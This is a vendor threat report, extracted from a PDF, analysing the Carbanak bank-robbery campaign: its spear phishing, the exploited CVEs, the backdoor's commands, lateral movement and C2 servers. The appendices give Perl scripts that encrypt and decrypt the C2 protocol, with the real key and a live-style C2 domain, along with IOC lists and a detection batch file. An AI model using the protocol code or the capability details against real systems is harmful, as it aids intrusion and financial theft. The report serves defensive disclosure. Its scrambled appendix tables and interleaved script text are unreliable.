CARBANAK APTTHE GREAT BANK ROBBERYVersion 2.0 #Carbanak2Table of contents1. Executive Summary 32. Analysis 5 2.1 Infection and Transmission 5 2.2 Malware Analysis – Backdoor.Win32.Carbanak 7 2.3 Lateral movement tools 18 2.4 Command and Control (C2) Servers 193. Conclusions 23APPENDIX 1: C2 protocol decoders 24APPENDIX 2: BAT file to detect infection 27APPENDIX 3: IOC hosts 28APPENDIX 4: Spear phishing 34APPENDIX 5: MD5 hashes of Carbanak samples 3631. Executive Summary From late 2013 onwards, several banks and financial institutions have been attacked by an unknown group of cybercriminals. In all these attacks, a similar modus operandi was used. According to victims and the law enforcement agencies (LEAs) involved in the investigation, this could result in cumulative losses of up to 1 billion USD. The attacks are still active. This report provides a technical analysis of these attacks. The motivation for the attackers, who are making use of techniques commonly seen in Advanced Persistent Threats (APTs), appears to be financial gain as opposed to espionage. An analysis of the campaign has revealed that the initial infections were achieved using spear phishing emails that appeared to be legitimate banking communications, with Microsoft Word 97 – 2003 (.doc) and Control Panel Applet (.CPL) files attached. We believe that the attackers also redirected to exploit kits website traffic that related to financial activity. The email attachments exploit vulnerabilities in Microsoft Office 2003, 2007 and 2010 (CVE-2012-0158 and CVE-2013-3906) and Microsoft Word (CVE-2014- 1761). Once the vulnerability is successfully exploited, the shellcode decrypts and executes the backdoor known as Carbanak. Carbanak is a remote backdoor (initially based on Carberp), designed for espionage, data exfiltration and to provide remote access to infected machines. Once access is achieved, attackers perform a manual reconnaissance of the victim’s networks. Based on the results of this operation, the attackers use different lateral movement tools in order to get access to the critical systems in the victim´s infrastructure. They then install additional software such as the Ammyy Remote Administration Tool, or even compromise SSH servers. Notably, some of the latest versions of the analyzed Carbanak malware appear not to use any Carberp source code. Once the attackers successfully compromise the victim´s network, the primary internal destinations are money processing services, Automated Teller Machines (ATM) and financial accounts. In some cases, the attackers used the Society for Worldwide Interbank Financial Telecommunication (SWIFT) network to transfer money to their accounts. In others, Oracle databases were manipulated to open payment or debit card accounts at the same bank or to transfer money between4accounts using the online banking system. The ATM network was also used to dispense cash from certain ATMs at certain times where money mules were ready to collect it. As part of the attack´s reconnaissance phase, video recordings of the activities of bank employees, particularly system administrators, were made. The videos were sent to the C2 server. Please note that the attackers abused the aforementioned services by impersonating legitimate local users who had the permissions to perform the actions later reproduced by the cybercriminals. As far as we know, none of the aforementioned services were attacked nor was any specific vulnerability within them exploited. Of the 100 banking entities impacted at the time of writing this report, at least half have suffered financial losses, with most of the victims located in Russia, USA, Germany, China and Ukraine. The magnitude of the losses is significant. For example, one victim lost approximately $7.3 million (USD) due to ATM fraud; another suffered a $10 million (USD) loss due to the exploitation of its online banking platform. Stolen funds were transferred out of the affected countries to bank accounts in the US and China. Additionally some of the C2 servers have log entries indicating connections to systems located in the US. Telemetry indicates that the attackers are expanding operations to other regions, such as Asia, the Middle-East, Africa and Europe. This report discusses the attack vectors, infection mechanisms and toolkits used by the attackers to exploit the network after the initial infection, as well as the operational details and geographical distribution of this campaign.52. Analysis During the spring of 2014, Kaspersky Lab was involved in a forensic analysis of ATMs dispensing cash to people located near them but with no physical interaction according to security cameras. No malware was detected on these ATMs. However, Carberp-like malware was found on a computer that was connected to them via VPN. Following the investigation of this incident, in the summer of 2014, Kaspersky Lab identified the same Carberp-like malware in another investigation involving a bank, where criminals were able to gain access to its online banking systems. In this investigation, we started analyzing all the computers in the bank’s infrastructure in order to find the source of the infection. We found spear phishing emails with CPL files attached that, after a successful infection, install the same Carberp-like malware we had previously found in the case involving the ATMs. There is evidence indicating that in most cases the network was compromised for between two to four months, and that many hundreds of computers within a single victim organization may have been infected. This period of time was used by the attackers to get access to the right victims and critical systems, and to learn how to operate their tools and systems to get the cash out. Carbanak contains an espionage component that allows the attackers to take control of video capabilities on the victim systems. Thanks to this, long term observation and reconnaissance could be conducted. This allowed the attackers to understand the protocols and daily operational tempo of their targets. Based on this understanding, exploitation methodologies and mechanisms were developed and tailored to each victim.2.1 Infection and Transmission All observed cases used spear phishing emails with Microsoft Word 97 – 2003 (.doc) files attached or CPL files. The doc files exploit both Microsoft Office (CVE- 2012-0158 and CVE-2013-3906) and Microsoft Word (CVE- 2014-1761). There are indicators that point to a possible Chinese origin for the exploits used in these attachments. Command and Control (C2) servers located in China have been identified in this campaign. In addition, registration information for some of the domains use details of supposedly Chinese citizens. Obviously, all this could just be a red herring.6The targets were all employees affiliated to the affected institution. The spear phishing email messages appeared legitimate and in some cases were sent from compromised coworkers´ accounts. In this way compromised systems were used as a transmission vector. Given that the victims were mostly Russian-speaking financial institutions, the names of the attachments we have identified were generally in Russian. Examples include “Соответствие ФЗ-115” and “Приглашение” which translate into “Accordance to Federal Law” and “Invitation” respectively. This is enough to induce a typical employee to open the attachment and execute the malware. For a complete list of file names see Appendix 4. The following is an example of a Carbanak spear phishing email:Translated:In this case, the attachment was a CPL file compressed using the Roshal Archive (.rar) format. Once the remote code execution vulnerability is successfully exploited, it installs Carbanak on the victim's system. The complete list of observed spear phishing emails can be found in Appendix 1 – Spear phishing. An additional infection vector that we believe was used by the criminals is a classical drive-by-download attack. We have found traces of the Null and the RedKit exploits kits.7Figure 1. Null Exploit Kit – statistics on victims, found in one Carbanak C2 The image above translates as Country_name, All visitors, Unique visitors, Banned visitor, Revoked infections, Infected.2.2 Malware Analysis – Backdoor.Win32.Carbanak Carbanak is a backdoor used by the attackers to compromise the victim's machine once the exploit, either in the spear phishing email or exploit kit, successfully executes its payload. This section provides a functional analysis of Carbanak’s capabilities. Carbanak copies itself into “%system32%\com” with the name “svchost.exe” with the file attributes: system, hidden and read-only. The original file created by the exploit payload is then deleted. To ensure that Carbanak has autorun privileges the malware creates a new service. The naming syntax is “<ServiceName>Sys” where ServiceName is any existing service randomly chosen, with the first character deleted. For example, if the existing service´s name is “aspnet” and the visible name is “Asp.net state8service”, the service created by the malware would be “aspnetSys” with a visible name of “Sp.net state service”. Before creating the malicious service, Carbanak determines if either the avp.exe or avpui.exe processes (components of Kaspersky Internet Security) is running. If found on the target system, Carbanak will try to exploit a known vulnerability in Windows XP, Windows Server 2003, Windows Vista, Windows Server 2008, Windows 7, Windows 8, and Windows Server 2012, CVE-2013-3660, for local privilege escalation. We believe this is not relevant and that the attackers adapt their tools to the victim´s defenses. Carbanak creates a file with a random name and a .bin extension in %COMMON_APPDATA%\Mozilla where it stores commands to be executed. Then the malware gets the proxy configuration from the registry entry: [HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings] and the Mozilla Firefox configuration file in: %AppData%\Mozilla\Firefox\<ProfileName>\prefs.jsHow to detect Carbanak One of the best methods for detecting Carbanak is to look for .bin files in the folder: \All users\%AppData%\Mozilla\ The malware saves files in this location that will later be sent to the C2 server when an internet connection is detected. A .BAT script for detecting infections is provided in the Appendixes.Additionally, Carbanak can obtain proxy configuration information from headers sent through an application via SOCKS or HTTP. Carbanak injects its code into svchost.exe. Most of the actions described below happen within this process. Carbanak downloads the file kldconfig.plug from its C2 server. This file includes the names of the processes to be monitored. Once the system is infected, Carbanak logs keystrokes and takes screenshots every 20 seconds. This monitoring is performed by intercepting the ResumeThread call.9To enable connections to the infected computer using the Remote Desktop Protocol (RDP), Carbanak sets Termservice service execution mode to Auto. Also, after executing this service, it modifies the executable code in memory in order to establish simultaneous work processes for both remote and local users. Modules modified in this process are: termsrv.dll, csrsrv.dll, msgina.dll and winlogon.exe. If Carbanak detects the banking application BLIZKO (funds transfer software) in the infected computer, it sends a special notification to its C2 server. Carbanak is also aware of the IFOBS banking application and can, on command, substitute the details of payment documents in the IFOBS system. To communicate with its C2 server, Carbanak uses the HTTP protocol with RC2+Base64 encryption, adding additional characters not included in Base64. It also inserts strings with different extensions (.gif,.htm, etc.) at random locations in the HTTP request. Example of a typical Carbanak request:Carbanak sends its collected monitoring data to its C2 server. It also receives commands. The commands are compared with a hash table; if there is a match Carbanak performs the associated action:Hash Executes all commands stored in the configuration file. Sets malware state flag. Sends captured screen or process window video to C2. Downloads and runs executable file from C2. Executable file is stored in %TEMP% with a random name. Downloads and run “Ammy Admin” remote control software and adds it to the system´s firewall exclusion list. Malware update. Monitoring configuration update («klgconfig.plug»). Kills the operating system through the following actions: 1- Puts in «ImagePath» registry [HKLM\SYSTEM\ControlSet001\ services\ACPI], [HKLM\SYSTEM\ControlSet002\services\ACPI] and [HKLM\SYSTEM\CurrentControlSet\services\ACPI] bad data. 2- Writes bytes with value zero into the first 512 bytes of hardrive Creates network tunnel to specified network address, routing all traffic there. Uses specified proxy settings. Changes C&C server. Creates or deletes user. Modifies “termsrv.dll”, “csrsrv.dll, “msgina.dl” and “winlogon. exe” modules. Modification allows multiple connections via RDP protocol and makes RDP persistent. Loads and overwrites .dll responsible for passwords policy. New .dll location points to «Notification Packages» [HKLM\ System\ CurrentControlSet\Control\Lsa] registry key. Deletes specified service or file. Executes specified command hash. Loads and executes file from specified network location. File executes in memory and is not stored on the harddrive. Sends local user system password to C2. Creates and sends screenshots. Turns off malware activity for a specified period of time. Unknown. Uploads specified file or directory. Establish VNC session. Unknown. Unknown.11In order to render the malware less suspicious, the latest Carbanak samples are digitally signed: 1. footprintcrsgn.dllMD5 08F83D98B18D3DFF16C35A20E24ED49AFigure 2. Carbanak digital signature122. PAExec_Move0.datMD5 972092CBE7791D27FC9FF6E9ACC12CC3Figure 3. Carbanak digital signature13One of Carbanak’s lateral movement tools is also digitally signed: 3. PAExec-6980-PB-FS-01.ex_MD5 86A5C466947A6A84554843D852478248Figure 4. Carbanak lateral movement tool digital signature14Geographical Distribution Known samples of Carbanak have been uploaded to VirusTotal from the following locations:Figure 5. Countries from which Carbanak has been uploadedKnown exploits that download Carbanak have been uploaded to VirusTotal mostly from Russia.According to KSN data, victims are distributed geographically as follows:Figure 6. Geographical distribution of victims according to KSN data The analyzed Carbanak samples, excluding some obvious outliers, have the following compilation time distribution:Figure 7. Carbanak compilation timestamp distribution1516It is also very interesting to see the distribution of Carbanak submissions to VirusTotal. This way we can identify periods when the malware came to the attention of potential victims and security researchers, and helps to reveal peaks in the group’s activity:Figure 8. Distribution of Carbanak submissions to VirusTotalSince the beginning of this case, Kaspersky Lab has worked in cooperation with the LEAs investigating it. During the investigation LEAs shared with us statistical data from their research that helped us to complete our picture of the campaign.The following map shows targets’ IP addresses found in three of Carbanak’s Linux servers at the end of October 2014:17Figure 9. Geographical distribution of targets according to C2 data18Figure 10. Geographical distribution of victims according to C2 data2.3 Lateral movement tools Carbanak uses different tools on infected systems, each one with a different purpose. There appears to be a preference for the Ammyy Admin remote administration tool for remote control. Specifically, the attackers have been it is commonly whitelisted in the victims’ environments as a result of being used regularly by administrators. In another instance, a Secure Shell (SSH) backdoor was used to communicate This indicates that the attackers did not limit themselves to Microsoft Windows environments. In this case, the victim used the Telnet/SSH client PuTTY to connect to the server, and the attackers recompiled the machine’s SSH daemon with a backdoor so they could gain direct access. Logs for these tools indicate that they were accessed from two different IPs, probably used by the attackers, and located in Ukraine and France. We have also found traces of many different tools used by the attackers inside the victim´s network to gain control of additional systems, such as Metasploit, PsExec or Mimikatz.192.4 Command and Control (C2) Servers There appear to be four distinct types of C2 servers: • Linux servers used for issuing commands to deployed Carbanak instancesand for receiving collected monitoring data;• Windows servers used for remote connections to victim systems; • Backup servers; and • Drop servers where additional executable files (e.g. remote administrationtools) are hosted.Server rotation occurs more or less on a biweekly basis. For a complete list of identified Carbanak servers please check the regularly updated Carbanak IOC document. The current list of IOCs is provided at Appendix 3 in his document. Some of these C2 servers are responsible for dropping Ammyy (configuration and executable files), the KLG plugin configuration (list of processes to monitor) and the VNC server (both 32 and 64 bits to be injected in rundll). In one of the observed servers there was also a Metasploit module.Figure 11. Carbanak administration panel running in Linux20Figure 12. Carbanak administration panel running in Linux, list of pluginsFigure 13. Carbanak administration panel running in Windows able to run RDP,VNC, proxy and tunnels via CarbanakVictim systems are catalogued in the servers’ databases. The victims belong to a number of different communities, thus simplifying administration. In all, 85 different victims belonging to seven communities were found.21Attacker´s operational details Additionally, the malicious servers contain video files that capture a victim´s activity. While the videos are stored using a compressed format which provides poor image quality, the selected format minimizes upload bandwith and is of sufficient quality for the attackers to understand the victims’ activities. The video file naming conventions used the name of the application in the foreground (e.g., Outlook, Cmd, etc.) and only recorded user activity. This helped the attackers to both navigate to files of interest and to discard superfluous files.Figure 14. Special video player designed to watch Carbanak´s video streamUsing the intelligence gained from video and other monitoring techniques, the attackers developed an operational picture of the victim's workflow, tooling and practices. This picture helps the attackers to deploy their malicious operations, for example: • Attackers created fake transactions in the victim’s internal database after the verification process, thus avoiding discovery of the fraudulent activity; • Attackers used the victim’s internal command utilities to insert fraudulentoperations in the transaction queue.In general, the attackers demonstrated great versatility, using attack methodologies best suited to a specific victim’s operational methodology. However, they seemed to deliberately limit the amount of money stolen per victim to $10 million USD. This limit may be explained as the maximum amount22of money that can be transferred via mule services, or the maximum amount of money that is budgeted in banks for fraud risks in order to minimize the chances of LEAs and the bank´s anti-fraud teams from doing a full blown analysis.Figure 15. List of PIN KVC used on ATMsSensitive bank documents have be found on the servers that were controlling Carbanak. They included classified emails, manuals, crypto keys, passwords and so on. For example, the file in the above figure has KVC (key verification codes) keys that are used by ATMs to check the integrity of the PIN numbers of its users. In other cases involving ATMs, the criminals were able to control computers that had access to the internal ATM network. If the bank had enabled remote access to ATMs, the criminals started using this access to remotely withdraw cash. Criminals used no malware to operate the ATM dispenser; instead they used standard utilities to control and test ATM equipment.233. Conclusions Malware targeting the finance industry (both companies and consumers) continues to evolve. The Carbanak malware used in the on-going campaign described in this report has been very successful in terms of generating revenue. Of particular interest are the attack methods, similar to those used in sophisticated cyber-espionage APTs. As such, they represent a new and disturbing trend in the cybercrime market of increasing attack sophistication. Despite increased awareness of cybercrime within the financial services sector, it appears that spear phishing attacks and old exploits (for which patches have been disseminated) remain effective against larger companies. Attackers always use this minimal effort approach in order to bypass a victim´s defenses. Advanced control and fraud detection systems have been used for years by the financial services industry. However, these focus on fraudulent transactions within customer accounts. The Carbanak attackers bypassed these protections, by for example, using the industry-wide funds transfer (the SWIFT network), updating balances of account holders and using disbursement mechanisms (the ATM network). In neither of these cases did the attackers exploit a vulnerability within the service. Instead, they studied the victim´s internal procedures and pinpointed who they should impersonate locally in order to process fraudulent transactions through the aforementioned services. It is clear that the attackers were very familiar with financial services software and networks. As part of an automated reconnaissance phase, the Carbanak malware checked victim systems for the presence of specialized and specific banking software. Only after the presence of banking systems was confirmed, were victims further exploited. To date, attacks against approximately 300 IP addresses around the world have been observed on analyzed C2s. It is possible that these attacks were coordinated to maximize returns prior to industry-wide information sharing and the implementation of countermeasures. Existing telemetry indicates that the Carbanak attackers are trying to expand operations to other Baltic and Central Europe countries, the Middle East, Asia and Africa. Carbanak may be responsible for losses as high as $1 billion USD. We believe that the Carbanak campaign is a clear indicator of a new era in cybercrime in which criminals use APT techniques directly against the financial industry instead of through its customers. APTs are not only for stealing information anymore.24APPENDIX 1: C2 protocol decoders Decryptor#!/usr/bin/perl -w #Work with Carbanak c2 use strict; use warnings; use Crypt::CBC; use Crypt::Cipher::RC2; use MIME::Base64; use LWP::Simple; #my $c2 = "worldnewsonline.pw"; #my $reguest = "1234567890123456"; my $reguest_was = "JybDHkfWGURJPuWeUpPMX/ca9BThbDim0Hdk/9YzkJS7m8a19tz QwZxo1vvQ/r/7SHJcCm4tdpZGp.dmDwKf MjpWBM18eX8VUiimyaUZMGoClZ6eShS9tLCK tuHvlMQ3Dc26y90FbPIua.7LGHGZCBPj.vd08DUENC5oAE4V fyUz.shtml"; $reguest_was =~ tr/\/\=\&\?//d; my $replace = ""; my $find=".shtml"; $reguest_was =~ s/\Q$find\E//g; $reguest_was =~ s/-/+/g; $reguest_was =~ s/\./\//g; print "$reguest_was\n"; my $iv = substr $reguest_was,0,8; $reguest_was = substr $reguest_was,8; my $base64_decoded1 = decode_base64("$reguest_was"); print "$base64_decoded1\n"; my $length = length($base64_decoded1); print "length is: $length\n"; print "iv is: $iv\n"; print "req is: $reguest_was\n"; my $base64_decoded = "${base64_decoded1}"; my $key = "vfDGbiwmiqdN6E2N"; #my $key = "1234567812345678"; my $cipher = Crypt::CBC->new( -cipher=>'Cipher::RC2', -header=>'none', -literal_key=>1, -key=>$key, – keysize=>16, -iv=>$iv ); my $plaintext = $cipher->decrypt($base64_decoded); print "Decode:\ n$plaintext\n"; #Decrypt is #HWUMRbvuwKQCrkOhuckIXpdFgtd|new0878802c8004333a3|data=listprocess|pro cess=svchost.exe|idproce ss=4294967295|lBHReFDRDfYG #my $url = "url"; #print $url; #my $contents = get($url); #print $contents;25Encryptor#!/usr/bin/perl -w #Decrypt Carbanak c2 responce use strict; use warnings; use Crypt::CBC; use Crypt::Cipher::RC2; use MIME::Base64; use LWP::Simple; my $c2 = "worldnewsonline.pw"; my $reguest = "HWUMRbvuwKQCrkOhuckIXpdFgtd|new0878802c8004333a3|data=listprocess|pro cess=svchost.exe|idproces s=4294967295|lBHReFDRDfYG"; my $iv = "JybDHkfW"; #should be random my $key = "vfDGbiwmiqdN6E2N"; my $cipher = Crypt::CBC->new( -cipher=>'Cipher::RC2', -header=>'none', -literal_key=>1, -key=>$key, – keysize=>16, -iv=>$iv ); my $ciphertext = $cipher->encrypt($reguest); my $base64_encoded = encode_base64("$ciphertext"); $base64_encoded =~ s/\x0a//g; $base64_encoded =~ s/\//\./g; $base64_encoded =~ s/\+/-/g; my $base64_encoded_ex = "${iv}${base64_encoded}.php"; my $url = "url{base64_encoded_ex}"; print $url; #url GURJPuWeUpPMXca9BThbDim0Hdk9YzkJS7m8a19tzQwZxo1vvQr7SHJcCm4tdp ZGp. dmDwKfMjpW.BM18eX8VUiimyaUZMGoClZ6eShS9tLCKtuHvlMQ3Dc26y90FbPIua.7LGHG ZCBPj.vd08D UENC5o.AE4VfyUz php| my $contents = get($url); print $contents;26Decrypt Files from CnC#!/usr/bin/perl -w #Decrypt Files from sended from c2 use strict; use warnings; use Crypt::CBC; use Crypt::Cipher::RC2; use MIME::Base64; use LWP::Simple; my $file=$ARGV[0]; open(DATA, "<$file"); open(DATA1, "<$file"); open(DATA2, "<$file"); binmode(DATA); binmode(DATA1); binmode(DATA2); my ($data, $n, $offset); while (($n = read DATA, $data, 1, $offset) != 0) { $offset += $n; } my $length = $offset; my $iv_len = read DATA1, my $iv, 8, 0; read DATA2, my $crypt_data, $length, 8; my $key = "vfDGbiwmiqdN6E2N"; my $cipher = Crypt::CBC->new( -cipher=>'Cipher::RC2', -header=>'none', -literal_key=>1, -key=>$key, – keysize=>16, -iv=>$iv ); my $plaintext = $cipher->decrypt($crypt_data); print "$plaintext";27APPENDIX 2: BAT file to detect infection @echo off for /f %%a in ('hostname') do set "name=%%a" echo %name% del /f %name%.log 2> nul if exist "c:\Documents and settings\All users\application data\ if exist %SYSTEMROOT%\System32\com\svchost.exe echo "COM if exist "c:\ProgramData\mozilla\*.bin" echo "BIN2 detected" >> %name%.log if exist %SYSTEMROOT%\paexec* echo "Paexec detected" >> %name%.log if exist %SYSTEMROOT%\Syswow64\com\svchost.exe echo "COM64 SC QUERY state= all | find "SERVICE_NAME" | findstr "Sys$"mozilla\*.bin" echo "BIN detected" >> %name%.log detected" >> %name%.logdetected" >> %name%.log if q%ERRORLEVEL% == q0 SC QUERY state= all | find "SERVICE_NAME" | findstr "Sys$" >> %name%.log seen in TypeSource: Sample md5/Detection name/ SystemComment2014-07 Carbanak’sLinux CnC 2014-10 Related to 2014-10 Related to backconnect 2014-12 Carbanak’sWindows backconnect backconnect backconnect0AD4892EAD67E65EC3DD4C978FCE7D92CnC of other malware used after Carbanak's infection CnC of other malware used to install CarbanakCnC of other malware used after Carbanak's infectionCnC of other malware used to install Carbanak Exploits drop zone that used to install Carbanak CnC of other malware used to install CnC of other malware used after Carbanak's infection29First seen in TypeSource: Sample md5/Detection name/ Carbanak backconnect 2014-10 Related to plugin CnC 2014-09 Carbanak’s plugin CnCVictim's logsVictim's logs32dsffds8743jsdf. used after Carbanak's infection Ip of SSHD backdoor installed after Carbanak's infection CnC of other malware used after Carbanak's infection CnC of other malware used to install Carbanak CnC of other malware used after Carbanak's infection CnC of other malware used after Carbanak's infection Exploits used to install Carbanak CnC of other malware used after Carbanak's infection CnC of other malware used after Carbanak's infectionCnC of other malware used after Carbanak's infectionCnC of other malware used to install CarbanakCnC of other malware used after Carbanak's infectionFirst seen in TypeSource: Sample md5/Detection name/ SystemComment2014-10 Related to backconnect 2014-10 Carbanak’sWindows backconnect 2014-10 Carbanak’sWindows used after Carbanak's infectionCnC of other malware used after Carbanak's infection CnC of other malware used after Carbanak's infection CnC of other malware used after Carbanak's infection CnC of other malware used to install Carbanak CnC of other malware used after Carbanak's infectionCnC of other malware used to install Carbanak CnC of other malware used to install Carbanak Used by criminals to control infected machines Used by criminals to control infected 2014-08 Related to CarbanakVictim's logs31First seen in TypeSource: Sample md5/Detection name/ CarbanakVictim's logsCnC of other malware used to install Carbanak Used by criyminals to control infected machines Used by criminals to control infected machinesCnC of other malware used to install Carbanak CnC of other malware used after Carbanak's infection CnC of other malware used after Carbanak's infection Used by criminals to control infected machines Exploits used to install Carbanak Used by criminals to control infected backconnect2014-10 Related to Carbanak 2014-10 Related to backconnect seen in TypeSource: Sample md5/Detection name/ SystemComment2014-10 Related to CarbanakVictim's logsadguard.name2014-07 Carbanak’sLinux CnCbeefeewhewhush- eelu.biz2014-07 Andromeda'sC&CVictim's logsVictim's logsblizko.netcomixed.orgcoral-trevel.com2014-07 Carbanak’sLinux CnC2014-12 Carbanak’sLinux CnC2014-07 Carbanak’sLinux CnCdatsun-auto.com 2014-04 Carbanak’sLinux CnCdi-led.comfinancialnewson- line.pw financialwiki.pwflowindaho.info2014-07 Carbanak’sLinux CnC2014-07 Carbanak’sLinux CnC2014-07 Carbanak’sLinux CnC2014-07 Carbanak’sLinux CnCfreemsk-dns.com 2014-08 Carbanak’sLinux CnCgjhhghjg6798.com 2014-10 Carbanak’sLinux CnCglonass-map.com 2014-12 Carbanak’sLinux CnCgreat-codes.com 2014-10 Carbanak’sicafyfootsinso.ruLinux CnC 2014-08 Related to CarbanakVictim's logsCnC of other malware used after Carbanak's infection CnC of other malware used after Carbanak's infection CnC of other malware used after Carbanak's infection CnC of other malware used after Carbanak's infectionCnC of other malware used to install CarbanakUsed by criminals to control infected machines CnC of other malware used to install Carbanak33IP/Domain nameivaserivaseeer.bizFirst seen in TypeSource: Sample md5/Detection name/ SystemComment2014-08 Related to CarbanakVictim's logsCnC of other malware used to install mind-finder.com2014-10 Carbanak’sLinux CnC2014-10 Carbanak’sLinux CnC2014-07 Carbanak’sLinux CnCF66992766D8F9204551B3C42336B4F6DF66992766D8F9204551B3C42336B4F6D0AD4892EAD67E65EC3DD4C978FCE7D92operatemesscont. net2014-08 Connect toinfected sshdVictim's logsparadise-plaza.com 2014-07 Carbanak’sLinux CnCInternet scanUsed by criminals to control infected machinespublic-dns.uspublics-dns.comsystemsvc.netsystem-svc.nettraider-pro.comtravel-maps.infoupdate-java.netveslike.comwefwe3223wfdsf. com Mon Apr 04 20:00:57 2011 update- java.net 1234567812345678 This section contains details on spear phishing emails sent by the attackers to Name of attachment: Name of attachment: financialnewsonline.pw/FYocDxXpn5MXsHwZX/kLUAbd3w2/uUTsarcVKYk2W3B6hnc Z/Gafh8U1W805Lo0N/np7E3ICR6qx8keLDJZqUGXJKBDzfc6VYz9TNIlktObQ.htm RDPfinancialnewsonline.pw, financialwiki.pw TXeyuryWcIuzxkWnyu Tue Jul 01 03:20:06 2014(Carbanak) (Probably fake)on Mon Aug 04 01:10:40 2014MD5: Name of attachment: url m8a19tzQwZxo1vvQ/r/7SHJcCm4tdpZGp.dmDwKfMjpWBM18eX8VUiimyaUZMGoClZ6 eShS9tLCKtuHvlMQ3Dc26y90FbPIua.7LGHGZCBPj.vd08DUENC5oAE4VfyUz.shtml RDPworldnewsonline.pw, worldnews24.pw JDvkyfhZxkMmDSwUkqvReIvC key Анкета- Заявление.docMD5: Name of attachment: public- dns.us 1234567812345678 Соответствие ФЗ- 115 от 21.07.2014г.docMD5: Name of attachment: datsun- auto.com/bDqxEs/Ta6IPJq3zqmRY- .5/8SgGLA- F/I9CstBYT1rK7kx.440Sbtru.cgi?QVzF=tNM2gdtMLscx5bB4uryjM&PfpxBukmcOaD- Tue Apr 08 05:44:12 2014(Carbanak)MD5: Name of attachment: Fri Aug 08 00:48:07 2014 worldnewsonline.pw, worldnews24.pw vfDGbiwmiqdN6E2N Name of attachment: /cBAWFvkXi94QxShRTaVVn/YzAxD/X0sZEud.5gNItbvozI3tqT5ly9UYLVii13.bml?tlxCFi Busj=2OVj&9GP=a5houGz&K.F=T&l0.7FBN75=nMPDrlGXq4s7cIAQ0Cl662IwVjxvsiTOlG 0d0pd HTTP/1.1 Host:datsun- auto.com(Carbanak)MD5: Name of attachment: Соответствие ФЗ- 115 от 02.07.2014г doc,MD5: Name of attachment: datsun- auto.com/bDqxEs/Ta6IPJq3zqmRY- .5/8SgGLA- F/I9CstBYT1rK7kx.440Sbtru.cgi?QVzF=tNM2gdtMLscx5bB4uryjM&PfpxBukmcOaD- Tue Apr 08 05:44:12 2014(Carbanak)36APPENDIX 5: MD5 hashes of Carbanak for Kaspersky Lab experts’ technical research, analysis, and thoughts.DailyBusiness ThreatPostFollow usKaspersky Lab global WebsiteDailyBusiness ThreatPostEugene Kaspersky BlogDailyKaspersky Lab B2C BlogDailyBusinessKaspersky Lab B2B BlogDailyBusiness Academy ThreatPostKaspersky Lab security news serviceDailyBusiness AcademyKaspersky Lab AcademyKaspersky Lab HQ39A/3 Leningradskoe Shosse Moscow, 125212 Russian Federationmore contact detailsTel: +7-495-797-8700 Fax: +7-495-797-8709 